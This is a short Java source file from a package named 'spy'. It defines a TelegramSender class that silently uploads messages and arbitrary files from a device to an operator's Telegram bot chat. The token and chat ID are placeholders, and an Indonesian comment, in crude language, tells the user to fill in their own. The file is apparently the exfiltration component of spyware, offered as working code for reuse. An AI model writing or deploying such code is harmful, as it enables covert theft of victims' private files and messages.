package com.deepalzz.spy;
import okhttp3.*; import org.json.JSONObject;
public class TelegramSender {
    // GANTI PUNYA LU KONTOL!
    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN";
    private static final String CHAT_ID = "YOUR_CHAT_ID";
    private static final String API = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
    private OkHttpClient client = new OkHttpClient();
    public void sendMessage(String msg) {
        try { JSONObject j = new JSONObject(); j.put("chat_id", CHAT_ID); j.put("text", msg);
            RequestBody b = RequestBody.create(MediaType.parse("application/json"), j.toString());
            Request r = new Request.Builder().url(API).post(b).build();
            client.newCall(r).execute();
        } catch (Exception e) {}
    }
    public void sendFile(String path, String caption) {
        try { java.io.File f = new java.io.File(path); if (!f.exists()) return;
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            RequestBody b = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("document", f.getName(),
                    RequestBody.create(MediaType.parse("application/octet-stream"), f))
                .addFormDataPart("caption", caption).build();
            Request r = new Request.Builder().url(url).post(b).build();
            client.newCall(r).execute();
        } catch (Exception e) {}
    }
}
